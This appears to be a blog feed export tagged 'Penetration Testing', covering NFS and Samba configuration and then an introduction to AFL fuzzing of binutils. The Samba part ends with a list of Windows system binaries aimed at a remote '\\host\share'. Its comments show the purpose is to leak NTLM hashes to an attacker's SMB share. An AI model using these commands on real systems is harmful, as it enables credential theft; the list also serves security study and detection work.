<h3 id="Softwares-1"><a href="#Softwares-1" class="headerlink" title="Softwares"></a>Softwares</h3><p>On CentOS (in <code>yum</code> repo) the <code>NFS</code> Utilities package (<code>nfs-utils</code>) contains the userspace server and client tools necessary to use the kernel’s <code>NFS</code> abilities. </p>
<p>On Ubuntu (in <code>apt</code> repo) we have <code>nfs-kernel-server</code> for server side and <code>nfs-common</code> for client side.</p>
<h3 id="nfs-utils"><a href="#nfs-utils" class="headerlink" title="nfs-utils"></a><code>nfs-utils</code></h3><p>It is for CentOS.<br>The package is <code>nfs-utils</code>.<br>Related packages are <code>rpcbind</code> (necessary) and <code>tcp_wrappers</code>.<br>Kernel object file needed is <code>nfs.ko</code>.</p>
<p>Port 2049 is used by <code>nfsd</code>, and other ports assigned by <code>rpcbind</code> (used to be <code>portmap</code>, before CentOS 6)</p>
<p><code>NFS</code> service process:</p>
<ul>
<li>rpc.nfsd      <ul>
<li>Most important <code>NFS</code> process, manage whether the client can log in</li>
</ul>
</li>
<li>rpc.mountd <ul>
<li>Mount and unmount <code>NFS</code>, including permission&#x2F;privilege management</li>
</ul>
</li>
<li>rpc.lockd <ul>
<li>Non-essential, manage file locks to avoid simultaneous write errors</li>
</ul>
</li>
<li>rpc.statd <ul>
<li>Non-essential, check file consistency, repair broken file</li>
</ul>
</li>
</ul>
<p>Logs in <code>/var/lib/nfs/</code>, and configurations are <code>/etc/exports</code> and <code>/etc/exports.d/*.exports</code>.</p>
<p>Format of config files:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dir    host1(opt1,opt2)    host2(opt1,opt2) ...     </span><br><span class="line"># assign &#x27;/dir&#x27; to host1, host2 and ...</span><br><span class="line"># &#x27;host&#x27; can be ipv4, ipv6, FQDN (Fully Qualified Domain Name) like:</span><br><span class="line">    172.18.0.0/255.255.0.0</span><br><span class="line">    172.18.0.0/16</span><br><span class="line">    www.domain.com</span><br><span class="line">    *.domain.com</span><br><span class="line"># &#x27;opt&#x27; can be default(ro,sync,root_squash,no_all_squash) and more:</span><br><span class="line">    ro,rw   -- read-only and read-write</span><br><span class="line">    async   -- asynchronous, not write immediately, high performance</span><br><span class="line">    sync    -- synchronization, write immediately after data changing</span><br><span class="line">    root_squash    -- Remote root mapping is nfsnobody/nobody, UID 65534</span><br><span class="line">    no_root_squash -- Remote root mapped as root user, without authority squeezed</span><br><span class="line">    all_squash     -- all remote users become nfsnobody/nobody</span><br><span class="line">    no_all_squash  -- retain the UID and GID of shared files</span><br><span class="line">    anonuid and anongid --  indicate that anonymous users are mapped to specific user UIDs and group GIDs instead of nfsnobody, which can be used with all_squash</span><br></pre></td></tr></table></figure>
<p>Some <code>NFS</code> related tools:</p>
<ol>
<li><code>rpcinfo</code>: see <code>RPC</code> information<ul>
<li>-p [hostname]     see port list</li>
<li>-s [hostname]     see registered programs</li>
</ul>
</li>
<li><code>exportfs</code>: manage <code>NFS</code><ul>
<li>-v    see all local <code>NFS</code> shares</li>
<li>-r    reread config files, and share dirs</li>
<li>-a    output all local shares, resume all suspended shares</li>
<li>-au   stop all local sharing</li>
</ul>
</li>
<li><code>showmount</code><ul>
<li>-e [hostname]     print shared file list</li>
</ul>
</li>
<li><code>autofs</code>:    service for auto mount<ul>
<li>package: <code>autofs</code></li>
<li>service: <code>/usr/lib/systemd/system/autofs.service</code></li>
<li>config file in <code>/etc/auto.master</code></li>
</ul>
</li>
<li><code>mount.nfs</code>: also for auto mount<ul>
<li>config file in <code>/etc/fstab</code></li>
</ul>
</li>
</ol>
<p>For mounting, there are some parameters:</p>
<ul>
<li>fg:   Mount at the front</li>
<li>bg:   Mount in the background</li>
<li>hard: Persistent mounting request</li>
<li>soft: Non-persistent request</li>
<li>intr: Work with ‘hard’, means can be interupted by <code>ctrl+c</code></li>
<li>rsize&#x2F;wsize:  Maximum number of bytes to read and write data at a time, rsize &#x3D; 32768</li>
<li>_netdev:  No mounting without network</li>
</ul>
<p>We can mount manually:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mount -o rw,nosuid,<span class="built_in">fg</span>,hard,intr x.x.x.x:/testdir /mnt/nfs/</span><br></pre></td></tr></table></figure>
<p>Or automatically:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/fstab</span><br><span class="line">x.x.x.x:/public /mnt/nfs nfs defaults,_netdev 0 0</span><br></pre></td></tr></table></figure>

<p>Using example:<br>Start service at server side. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir /data/share1</span><br><span class="line">$ mkdir /data/share2</span><br><span class="line">$ touch /data/share1/share1.txt</span><br><span class="line">$ touch /data/share2/share2.txt</span><br><span class="line">$ vim /etc/exports</span><br><span class="line">$ cat /etc/exports</span><br><span class="line">/data/share1/ *</span><br><span class="line">$ vim /etc/exports.d/test.exports</span><br><span class="line">$ cat /etc/exports.d/test.exports </span><br><span class="line">/data/share2 *</span><br><span class="line">$ exportfs -v</span><br><span class="line">$ exportfs -r</span><br><span class="line">exportfs: No options <span class="keyword">for</span> /data/share1/ *: suggest *(sync) to avoid warning</span><br><span class="line">exportfs: No options <span class="keyword">for</span> /data/share2 *: suggest *(sync) to avoid warning</span><br><span class="line">$ exportfs -v</span><br><span class="line">/data/share1  	&lt;world&gt;(sync,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)</span><br><span class="line">/data/share2  	&lt;world&gt;(sync,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)</span><br></pre></td></tr></table></figure>
<p>See sharing files and mount <code>NFS</code> dicks at client side.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ showmount -e nfs_server_ip</span><br><span class="line">Export list <span class="keyword">for</span> nfs_server_ip:</span><br><span class="line">/data/share2 *             </span><br><span class="line">/data/share1 *</span><br><span class="line">$</span><br><span class="line">$ mkdir /mnt/nfs1</span><br><span class="line">$ mount nfs_server_ip:/data/share1 /mnt/nfs1</span><br><span class="line">$ ls /mnt/nfs1/</span><br><span class="line">share1.txt</span><br></pre></td></tr></table></figure>
<p>Examples for <code>NFS</code> config.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/exports</span><br><span class="line">/myshare server.example.com</span><br><span class="line">/myshare *.example.com</span><br><span class="line">/myshare server?.example.com</span><br><span class="line">/myshare server[0-20].example.com</span><br><span class="line">/myshare 172.25.11.10</span><br><span class="line">/myshare 172.25.0.0/16</span><br><span class="line">/myshare 2000:472:18:b51:c32:a21</span><br><span class="line">/myshare 2000:472:18:b51::/64</span><br><span class="line">/myshare *.example.com 172.25.0.0/16</span><br><span class="line">/myshare desktop.example.com(ro)</span><br><span class="line">/myshare desktop.example.com(ro) server[0-20].example.com(rw)</span><br><span class="line">/myshare diskless.example.com(rw,no_root_squash)</span><br><span class="line"></span><br><span class="line">$ vim /etc/exports.d/test.exports</span><br><span class="line">/data/share2 * 192.168.32.0/24(ro) 192.168.32.7(rw)</span><br></pre></td></tr></table></figure>

<h3 id="nfs-kernel-server-and-nfs-common"><a href="#nfs-kernel-server-and-nfs-common" class="headerlink" title="nfs-kernel-server and nfs-common"></a><code>nfs-kernel-server</code> and <code>nfs-common</code></h3><p>Configurations and usage are the same as <code>nfs-utils</code>, see <a class="link"   href="https://www.digitalocean.com/community/tutorials/how-to-set-up-an-nfs-mount-on-ubuntu-18-04" >this link<i class="fas fa-external-link-alt"></i></a> for the details.</p>
<h2 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h2><p>What is <code>Samba</code>? A collection of different applications with when used together let a Linux server perform network actions like file serving, authentication&#x2F;authorization, name resolution and print services.</p>
<p>Like <code>CIFS</code>, Samba implements the <code>SMB</code> protocol which is what allows Windows clients to transparently access Linux directories, printers and files on a Samba server (just as if they were talking to a Windows server).</p>
<p>Crucially, <code>Samba</code> allows for a Linux server to act as a <code>Domain Controller</code>. By doing so, user credentials on the Windows <code>Domain</code> can be used instead of needing to be recreated and then manually kept in sync on the Linux server.</p>
<h3 id="Server-Message-Block"><a href="#Server-Message-Block" class="headerlink" title="Server Message Block"></a>Server Message Block</h3><p>The Server Message Block (<code>SMB</code>) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. </p>
<p>Using the <code>SMB</code> protocol, an application (or the user of an application) can access files or other resources at a remote server. </p>
<h3 id="Common-Internet-File-System"><a href="#Common-Internet-File-System" class="headerlink" title="Common Internet File System"></a>Common Internet File System</h3><p><code>CIFS</code> stands for “Common Internet File System.”, which is a dialect of <code>SMB</code>, is a particular implementation of the Server Message Block protocol, created by Microsoft.</p>
<p><code>CIFS</code> and <code>SMB</code> are interchangeable not only in a discussion but also in application – i.e., a client speaking <code>CIFS</code> can talk to a server speaking <code>SMB</code> and vice versa because <code>CIFS</code> is a form of <code>SMB</code>.</p>
<p>While they are the same top level protocol, there are still differences in implementation and performance tuning (hence the different names). Protocol implementations like CIFS vs SMB often handle things like file locking, performance over LAN&#x2F;WAN, and mass modification of file differently.</p>
<p>But, in this day and age, you should always use the acronym SMB.</p>
<p>Two reasons:</p>
<ol>
<li><p>The <code>CIFS</code> implementation of <code>SMB</code> is rarely used these days. Under the covers, most modern storage systems no longer use <code>CIFS</code>, they use <code>SMB</code> v2 or <code>SMB</code> v3. In the Windows world, <code>SMB</code> v2 has been the standard as of Windows Vista (2006) and <code>SMB</code> v3 is part of Windows 8 and Windows Server 2012.</p>
</li>
<li><p><code>CIFS</code> has a negative connotation amongst pedants. <code>SMB</code> v2 and <code>SMB</code> v3 are massive upgrades over the <code>CIFS</code> dialect, and storage architects who are near and dear to file sharing protocols don’t appreciate the misnomer. It’s kind of like calling an executive assistant a secretary.</p>
</li>
</ol>
<h3 id="Softwares-2"><a href="#Softwares-2" class="headerlink" title="Softwares"></a>Softwares</h3><p>Packages:</p>
<ul>
<li>samba:  Provide <code>SMB</code> service</li>
<li>samba-client:   Client</li>
<li>samba-common:   General tools</li>
<li>cifs-utils:     Client tools</li>
<li>samba-winbind:  Related to <code>AD</code></li>
</ul>
<p>Services:</p>
<ul>
<li>smbd: Provide <code>SMB</code> (<code>CIFS</code>) service, TCP:139,445</li>
<li>nmbd: <code>NetBIOS</code> name resolution, UDP:137,138</li>
</ul>
<p>Configuration file: <code>/etc/samba/smb.conf</code><br>Grammar check:  testparm [-v] [&#x2F;etc&#x2F;samba&#x2F;smb.conf]<br>Client softwares:   <code>smbclient</code>, <code>mount.cifs</code></p>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>Server side:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ systemctl start smb <span class="comment"># start smbd</span></span><br><span class="line">$ systemctl start nmb <span class="comment"># start nmbd</span></span><br></pre></td></tr></table></figure>

<p>Client side:<br>Universal Naming Convention (<code>UNC</code>) goes like:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">\\sambaserver\sharename</span><br><span class="line"><span class="comment"># &#x27;sambaserver&#x27; can be domain name or ip address </span></span><br></pre></td></tr></table></figure>
<p>Use <code>smbclient</code> to access:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ smbclient -L instructor.example.com</span><br><span class="line">$ smbclient -L instructor.example.com -U smb_user</span><br><span class="line"><span class="comment"># &#x27;-U&#x27; to assign user%password, or set environment variables: USER and PASSWD</span></span><br><span class="line">$ smbclient //instructor.example.com/shared -U username</span><br><span class="line">&gt;<span class="built_in">cd</span> directory</span><br><span class="line">&gt;get file1</span><br><span class="line">&gt;put file2</span><br></pre></td></tr></table></figure>
<p>Mount <code>CIFS</code> file system:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mount -o user=username,password=passwd //server/shared /mnt/smb</span><br></pre></td></tr></table></figure>
<p>Automatically mount at boot:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cat /etc/fstab</span><br><span class="line">//server/homes /mnt cifs credentials</span><br><span class="line"><span class="comment"># or use file to replace username &amp; password input</span></span><br><span class="line">cred=/etc/smb.txt 0 0</span><br><span class="line"></span><br><span class="line">$ cat /etc/smb.txt</span><br><span class="line">username=wang     <span class="comment">#或 user=wang</span></span><br><span class="line">password=password <span class="comment">#或 pass=password</span></span><br><span class="line">chmod 600 /etc/smb.txt       <span class="comment">#这一步加密很重要</span></span><br></pre></td></tr></table></figure>

<p>On Windows we have a lot of tools to use:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net.exe use \\host\share</span><br><span class="line">attrib.exe \\host\share</span><br><span class="line">bcdboot.exe \\host\share</span><br><span class="line">bdeunlock.exe \\host\share</span><br><span class="line">cacls.exe \\host\share</span><br><span class="line">certreq.exe \\host\share <span class="comment">#(noisy, pops an error dialog)</span></span><br><span class="line">certutil.exe \\host\share</span><br><span class="line">cipher.exe \\host\share</span><br><span class="line">ClipUp.exe <span class="literal">-l</span> \\host\share</span><br><span class="line">cmdl32.exe \\host\share</span><br><span class="line">cmstp.exe /s \\host\share</span><br><span class="line">colorcpl.exe \\host\share <span class="comment">#(noisy, pops an error dialog)</span></span><br><span class="line">comp.exe /N=<span class="number">0</span> \\host\share \\host\share</span><br><span class="line">compact.exe \\host\share</span><br><span class="line">control.exe \\host\share</span><br><span class="line">convertvhd.exe <span class="literal">-source</span> \\host\share <span class="literal">-destination</span> \\host\share</span><br><span class="line">Defrag.exe \\host\share</span><br><span class="line">DeployUtil.exe /install \\host\share</span><br><span class="line">DevToolsLauncher.exe GetFileListing \\host\share <span class="comment">#(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)</span></span><br><span class="line">diskperf.exe \\host\share</span><br><span class="line">dispdiag.exe <span class="literal">-out</span> \\host\share</span><br><span class="line">doskey.exe /MACROFILE=\\host\share</span><br><span class="line">esentutl.exe /k \\host\share</span><br><span class="line">expand.exe \\host\share</span><br><span class="line">extrac32.exe \\host\share</span><br><span class="line">FileHistory.exe \\host\share <span class="comment">#(noisy, pops a gui)</span></span><br><span class="line">findstr.exe * \\host\share</span><br><span class="line">fontview.exe \\host\share <span class="comment">#(noisy, pops an error dialog)</span></span><br><span class="line">fvenotify.exe \\host\share <span class="comment">#(noisy, pops an access denied error)</span></span><br><span class="line">FXSCOVER.exe \\host\share <span class="comment">#(noisy, pops GUI)</span></span><br><span class="line">hwrcomp.exe <span class="literal">-check</span> \\host\share</span><br><span class="line">hwrreg.exe \\host\share</span><br><span class="line">icacls.exe \\host\share</span><br><span class="line">LaunchWinApp.exe \\host\share <span class="comment">#(noisy, will pop an explorer window with the  contents of your SMB share.)</span></span><br><span class="line">licensingdiag.exe <span class="literal">-cab</span> \\host\share</span><br><span class="line">lodctr.exe \\host\share</span><br><span class="line">lpksetup.exe /p \\host\share /s</span><br><span class="line">makecab.exe \\host\share</span><br><span class="line">MdmDiagnosticsTool.exe <span class="literal">-out</span> \\host\share <span class="comment">#(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)</span></span><br><span class="line">mshta.exe \\host\share <span class="comment">#(noisy, pops an HTA window)</span></span><br><span class="line">msiexec.exe /update \\host\share /quiet</span><br><span class="line">msinfo32.exe \\host\share <span class="comment">#(noisy, pops a &quot;cannot open&quot; dialog)</span></span><br><span class="line">mspaint.exe \\host\share <span class="comment">#(noisy, invalid path to png error)</span></span><br><span class="line">mspaint.exe \\host\share\share.png <span class="comment">#(will capture hash, and display the remote PNG file to the user)</span></span><br><span class="line">msra.exe /openfile \\host\share <span class="comment">#(noisy, error)</span></span><br><span class="line">mstsc.exe \\host\share <span class="comment">#(noisy, error)</span></span><br><span class="line">netcfg.exe <span class="literal">-l</span> \\host\share <span class="literal">-c</span> p <span class="literal">-i</span> foo</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>pentest</tag>
        <tag>ftp</tag>
        <tag>smb</tag>
        <tag>cifs</tag>
        <tag>samba</tag>
        <tag>nfs</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL Fuzzing Intro</title>
    <url>/2020/02/14/2020-02-14-AFL-Fuzzing-Intro/</url>
    <content><![CDATA[<p>It’s not too late to learn fuzzing which is booming in this age.</p>
<h2 id="Fuzzing-Intro"><a href="#Fuzzing-Intro" class="headerlink" title="Fuzzing Intro"></a>Fuzzing Intro</h2><p>When performing software vulnerability mining or discovery, there are several technical methods includes: static analysis, dynamic analysis, symbolic execution and fuzzing.</p>
<ul>
<li>Static Analysis:<br>  Through its analysis of various syntax, semantics, data flow, etc., to carry out vulnerability discovery.</li>
<li>Dynamic Analysis:<br>  Step by step analysis of program execution. Normal way to track program’s action is to debug.</li>
<li>Symbolic Execution:<br>  Try to find out what input corresponds to what kind of running state, to cover all execution paths.</li>
<li>Fuzzing:<br>  Use a large amount of input data to automatically execute the program, so as to find out which inputs can make the program abnormal, and then analyze possible vulnerabilities.</li>
</ul>
<p>As for fuzzing, there’re still several types of it:</p>
<ol>
<li>Generation Based: generate test cases from scratch</li>
<li>Mutation Based: mutated from existing data samples based on some rules</li>
<li>Evolutionary: Contains both of the above, and mutates based on feedback from code coverage.</li>
</ol>
<h2 id="Brief-History"><a href="#Brief-History" class="headerlink" title="Brief History"></a>Brief History</h2><p>Not so brief, check it in <a href="/2020/10/02/2020-10-02-A-Brief-History-of-Fuzzing/">A Brief History of Fuzzing</a></p>
<h2 id="Fuzzing-Process"><a href="#Fuzzing-Process" class="headerlink" title="Fuzzing Process"></a>Fuzzing Process</h2><p>Take AFL as an example.<br>(Remember it’s a model only for afl-fuzz, not for every fuzzer)<br><img src="/imghost/afi/1.jpg" alt="AFL fuzzing process"><br>Do source code instrumentation before compilation, to record code coverage.</p>
<p>The debugger provides some input for the program, the leftmost testcases, which are put into a queue after the AFL is loaded.</p>
<p>For each iteration, AFL first takes a testcase from the queue, and then trims it to remove unnecessary data to improve the operation efficiency. </p>
<p>Then it performs mutation operations on the input. There are many modes of mutation, which can generate many new testcases. </p>
<p>Send these newly generated inputs to the target program to run. If it can generate a new execution path or cause the program to crash, put it in the queue. </p>
<p>Throughout the process, every program crash is recorded, which may represent a hidden vulnerability.</p>
<h2 id="Fuzzing-Technical-Points"><a href="#Fuzzing-Technical-Points" class="headerlink" title="Fuzzing Technical Points"></a>Fuzzing Technical Points</h2><h3 id="Input-data"><a href="#Input-data" class="headerlink" title="Input data"></a>Input data</h3><p>Because the input data is used to automatically execute the program, it is obvious that the generation of data will greatly affect the efficiency. </p>
<ol>
<li>If the input format of the target program is a pdf file, then files that do not meet the format will be difficult to enter the target program for running tests. </li>
<li>Even if the data meets the input requirements, maybe data A and data B trigger the same execution path, so running both A and B is a waste of resources. </li>
<li>For individual data A, maybe only a small part of it really controls the execution path, then trims for rest parts are a waste of resources.</li>
</ol>
<h3 id="Mutation-operation"><a href="#Mutation-operation" class="headerlink" title="Mutation operation"></a>Mutation operation</h3><p>The data given by the user is limited, but a lot of data is required to perform the fuzz test, so the fuzzer will generate new data based on the data given by the user. This process is called a mutation operation. </p>
<ol>
<li>So what mutation operators to define in the mutation process (choose what operations to change the original input data)? </li>
<li>Which one to choose when facing multiple mutation operators in one mutation? </li>
<li>Which input data can be used for mutation?</li>
</ol>
<h3 id="Increase-coverage"><a href="#Increase-coverage" class="headerlink" title="Increase coverage"></a>Increase coverage</h3><p>The essence of Fuzz is to use the input to detect whether the execution path corresponding to the current input will generate a possible vulnerability. Therefore, if more paths are covered, it means that more vulnerabilities may be detected. Increasing coverage is more like a fundamental issue. The solution to the first two issues is actually improving coverage.</p>
<h2 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h2><p>“American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time<br>instrumentation and genetic algorithms to automatically discover clean, interesting test cases<br>that trigger new internal states in the targeted binary.<br>This substantially improves the functional coverage for the fuzzed code. The compact synthesized<br>corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive<br>testing regimes down the road.”</p>
<p>Ok nice … but what does this actually mean? (even native speakers are confused)</p>
<h3 id="Binary-Instrumentation"><a href="#Binary-Instrumentation" class="headerlink" title="Binary Instrumentation"></a>Binary Instrumentation</h3><p>The first component of AFL is a wrapper for GCC&#x2F;CLang compilers that will inject during compilation its own assembly code into the target software.<br>The fuzzer will use this code to trace execution paths while feeding the system with new inputs and to determine if a new mutation of the input is able to trigger known or unkown (new) execution paths.</p>
<p>In compliation, we get the binary program from the source code. First turn source code to assembly code, then from assembly code to machine code.<br><code>gcc</code> (specifically the gcc compiler) is able to turn source code into assembly code, while <code>as</code> (also part of the GNU compiler suite) turns assembly code into machine code. </p>
<p><code>afl-gcc</code> is a wrapper for the gcc compiler. It calls the <code>gcc</code> compiler for compilation on the one hand, and specifies <code>afl-as</code> instead of <code>as</code> for assembly. <code>afl-as</code> is also a package of <code>as</code>. It analyzes the assembly code and performs instrumentation on the one hand, and calls <code>as</code> to change the assembly code after instrumentation to machine code.</p>
<p>If you can’t&#x2F;don’t want to recompile the source code of the target program, AFL also supports a QEMU mode, an extension that leverages the QEMU “user emulation” mode and allows callers to obtain instrumentation output for black-box, closed-source binaries. This mechanism can be then used by afl-fuzz to stress-test targets that couldn’t be built with afl-gcc.</p>
<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>Download the <a class="link"   href="http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz" >latest version<i class="fas fa-external-link-alt"></i></a> of the source code (<a class="link"   href="http://lcamtuf.coredump.cx/afl/releases/" >older releases<i class="fas fa-external-link-alt"></i></a>), extract it and do the usual:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ make </span><br><span class="line">$ sudo make install </span><br></pre></td></tr></table></figure>

<p>You have to set CPU to <code>performance mode</code> so that <code>afl-fuzz</code> can normally run.<br>Install CPU frequency management software and set</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install cpufrequtils</span><br><span class="line">$ cpufreq-info</span><br><span class="line">$ cpufreq-set -g performance</span><br></pre></td></tr></table></figure>
<p>Edit default mode so it won’t get back after reboot (not necessary)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install sysfsutils</span><br><span class="line">$ vim /etc/sysfs.conf</span><br><span class="line"><span class="comment"># add this line</span></span><br><span class="line">devices/system/cpu/cpu0/cpufreq/scaling_governor = performance</span><br></pre></td></tr></table></figure>
<p>Then it will be <code>performance mode</code> after next boot up.</p>
<h3 id="Run-an-Example-Reference"><a href="#Run-an-Example-Reference" class="headerlink" title="Run an Example ( Reference )"></a>Run an Example ( <a class="link"   href="https://www.evilsocket.net/2015/04/30/fuzzing-with-afl-fuzz-a-practical-example-afl-vs-binutils/" >Reference<i class="fas fa-external-link-alt"></i></a> )</h3><p>A relatively simple choice to fuzz is <a class="link"   href="http://ftp.gnu.org/gnu/binutils/" >binutils<i class="fas fa-external-link-alt"></i></a> (including readelf, objdump, etc.).<br>Finish binary instrumentation:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./configure CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span></span><br><span class="line"><span class="comment"># CC=&quot;afl-clang&quot; to use clang</span></span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
<p>The following command will instruct the system to output coredumps as files instead of sending them to a specific crash handler app</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> core &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
<p>Create an input folder to put ELF file, which AFL will use as a base template.<br>Create an output folder for fuzzer to store its state and all the generated samples that make the application crash or hang.<br>This time we give &#x2F;bin&#x2F;sh a chance.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir afl_in afl_out</span><br><span class="line">$ cp /bin/sh afl_in/</span><br></pre></td></tr></table></figure>
<p>Run the fuzzer</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-fuzz -i afl_in -o afl_out ./binutils/objdump -d @@</span><br><span class="line"><span class="comment"># &#x27;-i&#x27; to choose input files&#x27; dir</span></span><br><span class="line"><span class="comment"># &#x27;-o&#x27; to choose output files&#x27; dir</span></span><br><span class="line"><span class="comment"># then the following should be usage of target elf file</span></span><br><span class="line"><span class="comment"># &#x27;@@&#x27; will be replaced by input files when running</span></span><br></pre></td></tr></table></figure>
<p>And we see</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">[+] All <span class="built_in">set</span> and ready to roll!</span><br><span class="line"></span><br><span class="line">                       american fuzzy lop 2.52b (objdump)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 0 min, 54 sec       │  cycles <span class="keyword">done</span> : 0      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 24 sec       │  total paths : 40     │</span><br><span class="line">│ last uniq crash : none seen yet                      │ uniq crashes : 0      │</span><br><span class="line">│  last uniq hang : none seen yet                      │   uniq hangs : 0      │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 0 (0.00%)         │    map density : 3.75% / 4.37%         │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 1.28 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : bitflip 1/1           │ favored paths : 1 (2.50%)              │</span><br><span class="line">│ stage execs : 848/971k (0.09%)      │  new edges on : 31 (77.50%)            │</span><br><span class="line">│ total execs : 3048                  │ total crashes : 0 (0 unique)           │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 12.54/sec (zzzz...)   │  total tmouts : 0 (0 unique)           │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : 0/0, 0/0, 0/0                         │    levels : 2          │</span><br><span class="line">│  byte flips : 0/0, 0/0, 0/0                         │   pending : 40         │</span><br><span class="line">│ arithmetics : 0/0, 0/0, 0/0                         │  pend fav : 1          │</span><br><span class="line">│  known ints : 0/0, 0/0, 0/0                         │ own finds : 39         │</span><br><span class="line">│  dictionary : 0/0, 0/0, 0/0                         │  imported : n/a        │</span><br><span class="line">│       havoc : 0/0, 0/0                              │ stability : 100.00%    │</span><br><span class="line">│        trim : 0.00%/1879, n/a                       ├────────────────────────┘</span><br><span class="line">^C────────────────────────────────────────────────────┘          [cpu000: 53%]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>In the afl_out&#x2F;crashes folder you will find the files that made objdump crash, and you can run crash samples to see what happens.</p>
<h3 id="Corpus-Distillation"><a href="#Corpus-Distillation" class="headerlink" title="Corpus Distillation"></a>Corpus Distillation</h3><p>After finding input samples, we have to trim them to make them efficient and smaller size.<br>AFL provides two utils for us to do so: <code>afl-cmin</code> and <code>afl-tmin</code>.</p>
<p>(1) Remove files that executes same code – <code>afl-cmin</code></p>
<p><code>afl-cmin</code> aims to find the smallest subset with the same coverage as the full corpus.<br>For example: Suppose there are multiple files that all cover the same code, then the extra files are discarded. </p>
<p>It is used as follows:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</span><br><span class="line"><span class="comment"># if program requires input from stdin, the contents of testcase will be that</span></span><br><span class="line"><span class="comment"># always needs a &#x27;-f&#x27; parameter</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"></span><br><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</span><br><span class="line"><span class="comment"># if program requires input file in command line, use &#x27;@@&#x27;, which the real file name will replace in runtime</span></span><br></pre></td></tr></table></figure>

<p>(2) Reduce size of single input file – <code>afl-tmin</code></p>
<p>After decreasing of overall size, use <code>afl-tmin</code> to reduce single file’s size.</p>
<p>It has similar usage to <code>afl-cmin</code>, but still has two another working mode: <code>instrumented mode</code> (default) and <code>crash mode</code> (get rid of files causing abnormal exit.).</p>
<p>It is used as follows:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># instrumentation mode</span></span><br><span class="line">$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br><span class="line"></span><br><span class="line"><span class="comment"># crash mode</span></span><br><span class="line">$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br><span class="line"><span class="comment"># &#x27;-x&#x27; to work under crash mode</span></span><br></pre></td></tr></table></figure>
<p>Batch processing with a simple shell script</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- /path/to/tested/program [params] @@; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Perform-Instrumentation"><a href="#Perform-Instrumentation" class="headerlink" title="Perform Instrumentation"></a>Perform Instrumentation</h3><h4 id="Normal-Mode"><a href="#Normal-Mode" class="headerlink" title="Normal Mode"></a>Normal Mode</h4><p>Replace <code>gcc</code> and <code>g++</code> with <code>afl-gcc</code> and <code>afl-g++</code> in <code>Makefile</code><br>or<br>If built by autoconf, use</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./configure CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span></span><br></pre></td></tr></table></figure>
